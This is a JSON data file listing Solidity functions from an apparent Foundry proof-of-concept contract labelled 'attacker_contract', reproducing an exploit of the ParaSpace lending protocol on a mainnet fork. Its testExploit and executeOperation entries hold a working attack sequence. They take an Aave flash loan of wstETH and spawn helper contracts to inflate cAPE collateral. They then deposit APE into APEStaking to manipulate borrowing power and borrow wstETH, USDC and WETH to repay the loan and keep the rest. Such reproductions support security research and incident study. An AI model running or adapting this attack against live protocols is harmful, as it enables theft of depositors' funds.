[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initator,\n        bytes calldata params\n    ) external returns (bool) {\n        wstETH.approve(address(AaveFlashloan), type(uint256).max);\n        cAPE.approve(address(ParaProxy), type(uint256).max);\n        uint256 _amountOfShare = 1_840_000_000_000_000_000_000_000;\n        uint256 transferAmount = 6_039_513_998_943_475_964_078;\n        uint256 otherAmount = 3_676_225_912_400_376_673_786;\n        for (uint256 i; i < 7; ++i) {\n            if (i == 6) {\n                transferAmount = otherAmount;\n                _amountOfShare = 1_120_000_000_000_000_000_000_000;\n            }\n            slave = new Slave();\n            wstETH.transfer(address(slave), transferAmount);\n            slave.remove(_amountOfShare);\n            ParaProxy.supply(address(cAPE), cAPE.balanceOf(address(this)), address(this), 0);\n            console.log(i + 2, \"Create a new contract to replace wstETH with cAPE as collateral deposit in paraspace\");\n        }\n        console.log(\"9 Swap wstETH to APE\");\n        _amountOfShare = 1_840_000_000_000_000_000_000_000;\n        transferAmount = 6_039_513_998_943_475_964_078;\n        slave = new Slave();\n        wstETH.transfer(address(slave), transferAmount);\n        slave.remove(_amountOfShare);\n        SwapwstETHToAPE();\n        cAPE.withdraw(cAPE.balanceOf(address(this)));\n        console.log(\"10 deposit APE to APEStaking, manipulate borrowable assets\");\n        APE.approve(address(APEStaking), type(uint256).max);\n        APEStaking.depositApeCoin(APE.balanceOf(address(this)), address(cAPE));\n        console.log(\"11 borrow asset from paraspace\");\n        ParaProxy.borrow(address(wstETH), 44_952_823_905_004_708_422_332, 0, address(this));\n        ParaProxy.borrow(address(USDC), 7_200_000_000_000, 0, address(this));\n        ParaProxy.borrow(address(WETH), 1_200_000_000_000_000_000_000, 0, address(this));\n        console.log(\"12 swap USDC and WETH -> wstETH to repay flashLoan\");\n        WETH_USDCTowstETH(amount, premium);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_845_558);\n        vm.label(address(wstETH), \"wstETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(cAPE), \"cAPE\");\n        vm.label(address(APE), \"APE\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(ParaProxy), \"ParaProxy\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(APEStaking), \"APEStaking\");\n        vm.label(address(AaveFlashloan), \"AaveFlashloan\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        console.log(\"1 FlashLoan wstETH\");\n        AaveFlashloan.flashLoanSimple(address(this), address(wstETH), 47_352_823_905_004_708_422_332, new bytes(0), 0);\n\n        emit log_named_decimal_uint(\n            \"After exploit, WETH balance of Attacker:\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
    "description": ""
  }
]